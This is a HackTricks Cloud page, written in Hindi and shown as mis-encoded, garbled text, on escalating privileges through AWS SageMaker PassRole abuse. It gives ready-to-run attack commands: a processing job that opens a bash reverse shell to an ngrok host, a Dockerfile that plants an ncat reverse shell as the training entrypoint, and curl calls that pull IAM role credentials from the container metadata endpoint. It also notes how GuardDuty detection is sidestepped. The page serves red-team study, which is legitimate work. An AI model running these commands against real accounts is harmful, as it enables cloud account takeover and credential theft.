# AWS - Sagemaker Privesc

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## sagemaker

### `iam:PassRole`, `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

рдЗрд╕ рд╣рдорд▓реЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ **рдПрдХ рдРрд╕реЗ рд░реЛрд▓ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛ рдЬреЛ SageMaker рдХреЛ рдЗрд╕реЗ рдорд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ** (sagemaker.amazonaws.com). рдПрдХ рдмрд╛рд░ рдпрд╣ рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрд╕ рд░реЛрд▓ рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдиреЛрдЯрдмреБрдХ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::ACCOUNT-ID:role/service-role/AmazonSageMaker-ExecutionRole-xxxxxx
```
рдпрджрд┐ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ AWS рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **рдирдП рдиреЛрдЯрдмреБрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХрд╛ ARN** рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред рдЗрд╕реЗ рд╕реНрдкрд┐рди рдЕрдк рд╣реЛрдиреЗ рдореЗрдВ **рдХреБрдЫ рдорд┐рдирдЯ** рд▓рдЧреЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдПрдХ рдмрд╛рд░ рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдореЗрдВ рдПрдХ рдкреНрд░реА-рд╕рд╛рдЗрдиреНрдб URL рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд┐рд╕рд╕реЗ рд╣рдо **рдЕрдкрдиреЗ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЛрдЯрдмреБрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВ**ред рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ рднреА рд╕рдВрднрд╡ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдПрдХрд▓ рдЕрдиреБрдорддрд┐ рдФрд░ рдПрдХрд▓ API рдХреЙрд▓ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рд░рд▓ рд▓рдЧрд╛ред
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
рдпрджрд┐ рдпрд╣ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕реНрдкрд┐рди рдЕрдк рд╣реЛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ API рдХреЙрд▓ рдПрдХ **рд╕рд╛рдЗрдиреНрдб URL рд╡рд╛рдкрд╕ рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдо рдЕрдкрдиреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рд╡рд┐рдЬрд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВред рдПрдХ рдмрд╛рд░ рдЬрдм рдореИрдВ рдЕрдкрдиреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ Jupyter рдкреЗрдЬ рдкрд░ рдкрд╣реБрдБрдЪ рдЬрд╛рддрд╛ рд╣реВрдБ, рддреЛ рдореИрдВ рдКрдкрд░ рджрд╛рдИрдВ рдУрд░ "Open JupyterLab" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реВрдБрдЧрд╛, рдЬрд┐рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](<../../../.gitbook/assets/image (15) (1) (1).png>)

рдЕрдЧрд▓реЗ рдкреЗрдЬ рд╕реЗ, "Launcher" рдЯреИрдм рдореЗрдВ рд╕рдмрд╕реЗ рдиреАрдЪреЗ рддрдХ рд╕реНрдХреНрд░реЙрд▓ рдХрд░реЗрдВред "Other" рд╕реЗрдХреНрд╢рди рдХреЗ рдЕрдВрддрд░реНрдЧрдд, "Terminal" рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдЬрд┐рд╕реЗ рдпрд╣рд╛рдБ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](<../../../.gitbook/assets/image (27).png>)

рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛрдЧрд╛ рдХрд┐ рд╕рд┐рд░реНрдл **AWS CLI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**ред рджреВрд╕рд░рд╛ рд╡рд┐рдХрд▓реНрдк рд╣реЛрдЧрд╛ рдХрд┐ **EC2 рдореЗрдЯрд╛рдбреЗрдЯрд╛** рд╕реЗрд╡рд╛ рд╕реЗ рд╕реАрдзреЗ IAM рд░реЛрд▓ рдХреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░реЗрдВред

GuardDuty рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реЛрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм "рдЙрдиреНрд╣реЗрдВ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░реЗрдВ" рдКрдкрд░ рдкрдврд╝рддреЗ рд╕рдордп, рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдореЗрдВ рдпрд╣рд╛рдБ GuardDuty рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рдирд╣реАрдВ рд╣реИред рд╕рдВрдмрдВрдзрд┐рдд GuardDuty рдлрд╛рдЗрдВрдбрд┐рдВрдЧ рд╣реИ [тАЬUnauthorizedAccess:IAMUser/InstanceCredentialExfiltrationтАЭ](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11), рдЬреЛ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдЧрд╛ рдЕрдЧрд░ рдПрдХ рд░реЛрд▓ рдХреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ рдЪреБрд░рд╛рдИ рдЬрд╛рддреА рд╣реИрдВ рдФрд░ рдХрд╣реАрдВ рдФрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЬрд╛рддреА рд╣реИрдВред рд╣рдорд╛рд░реЗ рд▓рд┐рдП рд╕реМрднрд╛рдЧреНрдп рд╕реЗ, рдпрд╣ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдорд╛рд░реЗ рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдирд╣реАрдВ рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ рдПрдХ **AWS-рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реЗ рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рд╣реЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдореИрдиреЗрдЬреНрдб EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рд╣рдо рдЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╣рдорд╛рд░реЗ рд▓рдХреНрд╖реНрдп рдХреЗ GuardDuty рдбрд┐рдЯреЗрдХреНрдЯрд░реНрд╕ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЪрд┐рдВрддрд╛ рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП**ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** sagemaker рд╕реЗрд╡рд╛ рд░реЛрд▓ рдХреЗ рд▓рд┐рдП Privesc рдирд┐рд░реНрджрд┐рд╖реНрдЯред

### `sagemaker:CreatePresignedNotebookInstanceUrl`

рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд╕рдорд╛рди, рдЕрдЧрд░ Jupyter **рдиреЛрдЯрдмреБрдХреНрд╕ рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣реА рд╣реИрдВ** рдФрд░ рдЖрдк рдЙрдиреНрд╣реЗрдВ sagemaker:ListNotebookInstances рдХреЗ рд╕рд╛рде рд▓рд┐рд╕реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рддрд░реАрдХреЗ рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ)ред рдЖрдк **рдЙрдирдХреЗ рд▓рд┐рдП рдПрдХ URL рдЬрдирд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдореЗрдВ рдмрддрд╛рдП рдЧрдП рдЕрдиреБрд╕рд╛рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** sagemaker рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рд╕реЗ Privesc рд╕рдВрд▓рдЧреНрдиред

### `sagemaker:CreateProcessingJob,iam:PassRole`

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ **sagemaker рдХреЛ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧрдЬреЙрдм рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ sagemaker рднреВрдорд┐рдХрд╛ рдЬреБрдбрд╝реА рд╣реЛрддреА рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдХрдВрдЯреЗрдирд░ рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **AWS рдкреНрд░рдмрдВрдзрд┐рдд ECS рдЦрд╛рддрд╛ рдЙрджрд╛рд╣рд░рдг** рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ **рд╕рдВрд▓рдЧреНрди IAM рднреВрдорд┐рдХрд╛ рдХреА рд╕рд╛рдЦ рдЪреБрд░рд╛** рд╕рдХрддрд╛ рд╣реИред
```bash
# I uploaded a python docker image to the ECR
aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
--app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
--role-arn <sagemaker-arn-role>

# In my tests it took 10min to receive the shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #To get the creds
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** sagemaker рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП Privesc рдирд┐рд░реНрджрд┐рд╖реНрдЯред

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдиреМрдХрд░реА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, **рдордирдорд╛рдиреЗ рдХрдВрдЯреЗрдирд░ рдХреЛ рдЪрд▓рд╛рддреЗ рд╣реБрдП** рдЙрд╕рдХреЗ рд╕рд╛рде рдПрдХ **рднреВрдорд┐рдХрд╛ рд╕рдВрд▓рдЧреНрди** рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рднреВрдорд┐рдХрд╛ рдХреА рд╕рд╛рдЦреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="warning" %}
рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рдкрд┐рдЫрд▓реЗ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдХрдард┐рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ рдПрдХ Docker рдЗрдореЗрдЬ рдмрдирд╛рдиреА рд╣реЛрдЧреА рдЬреЛ рд╕реАрдзреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ rev shell рдпрд╛ creds рднреЗрдЬреЗрдЧреА (рдЖрдк рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдиреМрдХрд░реА рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдПрдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ)ред
```bash
# Create docker image
mkdir /tmp/rev
## Note that the trainning job is going to call an executable called "train"
## That's why I'm putting the rev shell in /bin/train
## Set the values of <YOUR-IP-OR-DOMAIN> and <YOUR-PORT>
cat > /tmp/rev/Dockerfile <<EOF
FROM ubuntu
RUN apt update && apt install -y ncat curl
RUN printf '#!/bin/bash\nncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh' > /bin/train
RUN chmod +x /bin/train
CMD ncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh
EOF

cd /tmp/rev
sudo docker build . -t reverseshell

# Upload it to ECR
sudo docker login -u AWS -p $(aws ecr get-login-password --region <region>) <id>.dkr.ecr.<region>.amazonaws.com/<repo>
sudo docker tag reverseshell:latest <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
sudo docker push <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
```
{% endhint %}
```bash
# Create trainning job with the docker image created
aws sagemaker create-training-job \
--training-job-name privescjob \
--resource-config '{"InstanceCount": 1,"InstanceType": "ml.m4.4xlarge","VolumeSizeInGB": 50}' \
--algorithm-specification '{"TrainingImage":"<account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell", "TrainingInputMode": "Pipe"}' \
--role-arn <role-arn> \
--output-data-config '{"S3OutputPath": "s3://<bucket>"}' \
--stopping-condition '{"MaxRuntimeInSeconds": 600}'

#To get the creds
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
## Creds env var value example:/v2/credentials/proxy-f00b92a68b7de043f800bd0cca4d3f84517a19c52b3dd1a54a37c1eca040af38-customer
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** sagemaker рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рддрдХ Privesc рдирд┐рд░реНрджрд┐рд╖реНрдЯред

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛рд╡рд░ (рд╕рдВрднрд╡рддрдГ) рдПрдХ **hyperparameter рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдиреМрдХрд░реА** рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛, рдЬрд┐рд╕ рдкрд░ рдПрдХ **рдордирдорд╛рдирд╛ рдХрдВрдЯреЗрдирд░ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрдЧрд╛** рдФрд░ рдЙрд╕рд╕реЗ рдПрдХ **рднреВрдорд┐рдХрд╛ рд╕рдВрд▓рдЧреНрди** рд╣реЛрдЧреАред\
_рдореИрдВрдиреЗ рд╕рдордп рдХреА рдХрдореА рдХреЗ рдХрд╛рд░рдг рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдкрд┐рдЫрд▓реЗ рд╢реЛрд╖рдгреЛрдВ рдХреЗ рд╕рдорд╛рди рд▓рдЧрддрд╛ рд╣реИ, рд╢реЛрд╖рдг рд╡рд┐рд╡рд░рдг рдХреЗ рд╕рд╛рде PR рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рддрдВрддреНрд░ рдорд╣рд╕реВрд╕ рдХрд░реЗрдВред_

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family)
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рднреЗрдЬрдХрд░ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рддрд░рдХреАрдмреЗрдВ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
